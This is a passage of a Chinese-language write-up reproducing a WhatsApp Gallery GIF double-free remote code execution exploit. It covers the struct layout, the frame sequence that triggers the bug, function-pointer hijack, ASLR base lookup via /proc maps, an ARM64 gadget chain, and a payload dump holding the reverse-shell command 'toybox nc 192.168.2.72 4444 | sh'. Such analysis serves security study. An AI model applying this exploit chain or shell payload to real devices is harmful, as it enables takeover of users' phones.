      -----------------------------------------------------------------------     B|               unsigned char *rasterBits;                                                                           |
      -----------------------------------------------------------------------     C|               uint_fast32_t rasterSize;                                                                             |
      -----------------------------------------------------------------------     D|               char *comment;                                                                                         |
      -----------------------------------------------------------------------     E|               uint_fast16_t loopCount;                                                                              |
      -----------------------------------------------------------------------     F|               uint_fast16_t currentLoop;                                                                            |
      -----------------------------------------------------------------------    10|               RewindFunc rewindFunction;                                                                        |
      -----------------------------------------------------------------------    11|    jfloat speedFactor;                              |        uint32_t stride;                                      |
      -----------------------------------------------------------------------    12|               jlong sourceLength;                                                                                     |
      -----------------------------------------------------------------------    13| isOpaque;|      void *frameBufferDescriptor;                                                                  |
      -----------------------------------------------------------------------    14| ...            |                 (padding)                                                                                 |
      -----------------------------------------------------------------------    }
此处（padding） 为自动补齐
可见 Sizeof(GifOnfo) = 8*（0x14+1）=168
构造一个有如下三帧的 gif 文件
    Sizeof(GifOnfo) 
     0
     0
当WhatsApp Gallery打开时， 如上所示的 gif 会触发double-free漏洞。有趣的事 WhatsApp Gallery
会解析GIF文件两次。  
‘贴上从blog里copy过来的内容  
*第一次解析:
    * Init:
        * GifInfo *info = malloc(168);
    * Frame 1:
        * info->rasterBits = reallocarray(info->rasterBits, 0x8*0x15, 1);
    * Frame 2:
        * info->rasterBits = reallocarray(info->rasterBits, 0x0*0xf1c, 1);
    * Frame 3:
        * info->rasterBits = reallocarray(info->rasterBits, 0x0*0xf1c, 1);
    * Frame 4:
        * does not matter, it is there to make this GIF file valid
    *第二次解析:
    * Init:
        * GifInfo *info = malloc(168);
    * Frame 1:
        * info->rasterBits = reallocarray(info->rasterBits, 0x8*0x15, 1);
    * Frame 2, 3, 4:
        * does not matter
    * End:
        * info->rewindFunction(info);
由于最终得到的是同一块内存，第一次申请时用来存储GifInfo结构体，第二次申请用来存储rasterBits，第二次申请后会用申请到的这段内存（跟存储GifInfo结构体同一块）存储解码后的输入数据（gif文件一帧），由于是同一块内存，所以解码后的数据会覆写原先GifInfo结构体的内容，包括会覆写info->rewind字段，这样info->rewind字段的值就被可控了，由于info->rewind是一个函数指针，所以是有一个函数指针被控了，
解码操作是在decoding.c的DDGifSlurp函数中，在这个函数解码完成主体解码后会在最后调用一次info->rewindFunction(info)函数，由于info->rewindFunction已经被改写成我们控制的值，所以PC会调转到我们写入的值（劫持PC）。
# 处理地址随机化与W^X机制
## ASLR
地址随机化的处理，需要配合一个内存泄露漏洞。由于我在本地机器上实现。我执行了如下的命令来确定基址：  
开启monitor check com.whatsapp 的 PID  
    sailfish:/ # cd /proc/3973                                                                                                                       
    sailfish:/proc/3973 # cat ./maps | grep 'libc.so'                                                                                           
    713ed55000-713ee1d000 r-xp 00000000 fd:00 441                            /system/lib64/libc.so
    713ee1e000-713ee24000 r--p 000c8000 fd:00 441                            /system/lib64/libc.so
    713ee24000-713ee26000 rw-p 000ce000 fd:00 441                            /system/lib64/libc.so
    sailfish:/proc/3973 # cat ./maps | grep 'libhwui.so'                                                                                     
    713eb03000-713ebf4000 r-xp 00000000 fd:00 374                            /system/lib64/libhwui.so
    713ebf4000-713ebfe000 r--p 000f0000 fd:00 374                            /system/lib64/libhwui.so
    713ebfe000-713ebff000 rw-p 000fa000 fd:00 374                            /system/lib64/libhwui.so
此处r-xp处就为基址啦，比如libc.so的基址为713ed55000。
## W^X
W^X机制，内存页不能同时设置为可执行(x)和可写(w)，  
劫持完PC后，想要执行代码 作者采用的方法是 gadget + system() 执行如下命令
    system("toybox nc 192.168.2.72 4444 | sh");
逆一下libpl_droidsonroids_gif.so，  
x0和x19指向info/ info->rasterBits  
首先把 x19+0x80(info->rewindFunction)替换成gadget的地址，再跳到system。  
gadget执行三条指令
    ldr x8,[x19,#0x18] 
    add x0,x19,#0x20   
    blr x8
第一条指令： 第一条 x8 = [x19+0x18]，也就是info->originalHeight; （info基址+偏移0x18）  
第二条指令： add x0, x19, #0x20,
将x0指向x19+0x20地址处，也就是info->sampleSize（info基址+偏移0x20)，arm架构下x0
用于穿参，即system接收的参数，所以要将x0指向我们想让它执行的参数内容。  
第三条指令 blr x8 == jump x8 == jump [x19+0x18] == jump info->originalHeight ==
jump system地址， 同时x0传参
摘取原文中的一段话，假设上述gadget的地址为AAAAAAAA，而system（）函数的地址为BBBBBBBB。
LZW编码之前的rasterBits缓冲区（帧1）如下所示：
    00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000010: 0000 0000 0000 0000 4242 4242 4242 4242  ........BBBBBBBB
    00000020: 746f 7962 6f78 206e 6320 3139 322e 3136  toybox nc 192.16
    00000030: 382e 322e 3732 2034 3434 3420 7c20 7368  8.2.72 4444 | sh
    00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
    00000080: 4141 4141 4141 4141 eeff                 AAAAAAAA..
正常的Android系统中，由于每个进程都是从Zygotes生成
即使有ASLR，如果WhatsApp被终止并重启，地址AAAAAAAA和BBBBBBBB也不会更改。如果是使用，需要结合内存泄露漏洞。
# 0x03 exp
[4]里下载了作者构造的exp，感兴趣的可以去下载。在本机里找了libc.so里
system()的地址以及libhwui.so里gadget的地址，两种思路
第一种
    ps | grep 'whatsapp' 
        cat ./map | grep 'libc.so'/'libhwui.so'
        adb pull &path/libc.so / &path/libhwui.so 
        拖入IDA查看偏移，打开python 进行计算
第二种 frida hook
复现效果如 前面 0x01 所示，成功的demo，作者的blog里有放.avi。
# 0x04 结论
无
# 0x05 参考
[1][https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/?nsukey=JELaCEv3gnVR%2BS05Vwf1sdQRZmjrb8fFIkcoF2nxPXFNsfHngtB%2FA%2BnL0QFvwQnWUObnZepLB7hVNX%2BKsjQ6CT1wY%2Bay0yfrt6awEUhfpupKk0lQvtqhhZX0uXRqbyjGMH6y1NWLt6wBS3Lh4ZauLCzWD9RJ2LaChRm6BomlqnoR%2Fp%2BqJQ6fefXCpz8ugnpYyEUaYQW5UPrdRD0%2BJgZ8mQ%3D%3D&from=singlemessage&isappinstalled=0](https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/?nsukey=JELaCEv3gnVR%2BS05Vwf1sdQRZmjrb8fFIkcoF2nxPXFNsfHngtB%2FA%2BnL0QFvwQnWUObnZepLB7hVNX%2BKsjQ6CT1wY%2Bay0yfrt6awEUhfpupKk0lQvtqhhZX0uXRqbyjGMH6y1NWLt6wBS3Lh4ZauLCzWD9RJ2LaChRm6BomlqnoR%2Fp%2BqJQ6fefXCpz8ugnpYyEUaYQW5UPrdRD0%2BJgZ8mQ%3D%3D&from=singlemessage&isappinstalled=0)  
[2].  
[3]   
[4]